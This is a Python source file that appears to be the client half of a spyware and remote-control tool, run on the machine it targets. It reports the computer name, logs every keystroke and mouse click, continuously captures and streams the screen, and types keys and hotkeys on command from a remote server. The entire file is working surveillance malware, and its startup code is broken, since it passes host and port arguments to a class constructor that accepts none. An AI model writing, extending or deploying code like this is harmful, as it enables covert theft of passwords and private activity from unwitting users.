import socket
import struct
import threading
from datetime import datetime
from pynput.keyboard import Listener
from pynput import mouse
import json
from zlib import compress
from mss import mss
import base64
import pyautogui
import os
import sys


WIDTH = 1900
HEIGHT = 1000


class Target():
    def __init__(self):
        self.client_socket = socket.socket()
        self.client_socket.connect(("127.0.0.1", 8000))
        Main(self.client_socket)


class Main():
    def __init__(self, client_socket):
        self.client_socket = client_socket
        name = os.environ['COMPUTERNAME']
        SuperSocket(self.client_socket).send_msg(("0").encode())
        SuperSocket(self.client_socket).send_msg((name).encode())
        threading.Thread(target=self.keylogger,
                             args=()).start()
        threading.Thread(target=self.mouse_logger,
                             args=()).start()
        threading.Thread(target=self.screen_caprure,
                             args=()).start()
        keystrokes = Keystrokes(self.client_socket)
        keystrokes.getting_msg()
        

    def keylogger(self):
        Keylogger(self.client_socket)
        
    def mouse_logger(self):
        Mouse_Logger(self.client_socket)
        
    def screen_caprure(self):
        screen = Screen_Capture(self.client_socket)
        screen.capturing()

class Keylogger():
    def __init__(self, client_socket):
        self.client_socket = client_socket
        self.n = 0
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def on_press(self, key):
        self.n = self.n+1

    def on_release(self, key):
        if self.n > 3:
            now = datetime.now()
            self.dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
            message = {
                "type": "logger",
                "data": f"{self.dt_string}: long {format(key)}\n"
            }
            message_to_send = json.dumps(message)
            SuperSocket(self.client_socket).send_msg((message_to_send).encode())
            self.n = 0
        else:
            now = datetime.now()
            self.dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
            message = {
                "type": "logger",
                "data": f"{self.dt_string}: {format(key)}\n"
            }
            message_to_send = json.dumps(message)
            SuperSocket(self.client_socket).send_msg((message_to_send).encode())            
            self.n = 0

class Mouse_Logger():
    def __init__(self, client_socket):
        self.client_socket = client_socket
        with mouse.Listener(on_click=self.on_click) as listener:
            listener.join()
            
    def on_click(self, x, y, button, pressed):
        if pressed:
            if button == mouse.Button.left:
                button_name = "left"
                
            elif button == mouse.Button.right:
                button_name = "right"
                
            else:
                button_name = "middle"
                
            now = datetime.now()
            self.dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
            message = {
                "type": "logger",
                "data": f"{self.dt_string}: Mouse clicked at {button_name} ({x}, {y})\n"
            }
            message_to_send = json.dumps(message)
            SuperSocket(self.client_socket).send_msg((message_to_send).encode())

class Screen_Capture():
    def __init__(self, client_socket):
        self.client_socket = client_socket
    
    def capturing(self):
        with mss() as sct:
        # The region to capture
            rect = {'top': 0, 'left': 0, 'width': WIDTH, 'height': HEIGHT}

            while True:
                # Capture the screen
                img = sct.grab(rect)
                # Tweak the compression level here (0-9)
                pixels = compress(img.rgb, 6)
                encoded_image = base64.b64encode(pixels).decode('utf-8')
                # Send pixels
                message = {
                    "type": "screen",
                    "data": encoded_image
                }
                message_to_send = json.dumps(message)
                SuperSocket(self.client_socket).send_msg((message_to_send).encode())
                
class Keystrokes():
    def __init__(self, client_socket):
        self.client_socket = client_socket
        
    def getting_msg(self):
        while True:
            data = (SuperSocket(self.client_socket).recv_msg()).decode()
            message = json.loads(data)
            if message["type"] == "command":
                
                if message["command"] == "press":
                    self.press_key_stroke(message["buttons"])
                    
                elif message["command"] == "write":
                    self.write_stroke(message["buttons"])
                    
                elif message["command"] == "hotkey":
                    self.hotkey_stroke(message["buttons"])
                    
                else:
                    pass
            else:
                pass
            
    def press_key_stroke(self, key):
        self.key = key
        pyautogui.press(self.key)
        
    def write_stroke(self, key):
        self.key = key
        pyautogui.write(self.key, interval=0.1)
        
    def hotkey_stroke(self, key):
        self.key = key
        self.splited_key = self.key.split("+")
        pyautogui.hotkey(self.splited_key)
        
class SuperSocket():
    def __init__(self, current_socket):  # make the self.current_socket euqal to current_socket
        self.current_socket = current_socket

    # create a pack with length of message and message and sending this pack to server
    def send_msg(self, msg):
        msg = struct.pack('>I', len(msg)) + msg
        self.current_socket.send(msg)

    def recv_msg(self):  # getting the message and understading what is the length of the message and return the the message
        raw_msglen = self.recvall(4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        return self.recvall(msglen)

    def recvall(self, msglen):  # getting the whole message and returning the data to the recv_msg
        data = b''
        while len(data) < msglen:
            packet = self.current_socket.recv(msglen - len(data))
            if not packet:
                return None
            data += packet
        return data


if __name__ == '__main__':
    try:
        if len(sys.argv) == 2:
            try:
                if "." in sys.argv[1]:
                    Target(sys.argv[1], 2000)

                elif int(sys.argv[1]) <= 65535 and int(sys.argv[1]) >= 1000:
                    Target("127.0.0.1", int(sys.argv[1]))

                raise ValueError
            except (ValueError, TypeError):
                Target("127.0.0.1", 2000)

        elif len(sys.argv) == 3:
            try:
                if int(sys.argv[2]) <= 65535 and int(sys.argv[2]) >= 1000:
                    Target(sys.argv[1], int(sys.argv[2]))
                raise ValueError
            except (ValueError, TypeError):
                Target("127.0.0.1", 2000)
        raise ValueError
    except (ValueError, TypeError):
        Target("127.0.0.1", 2000)
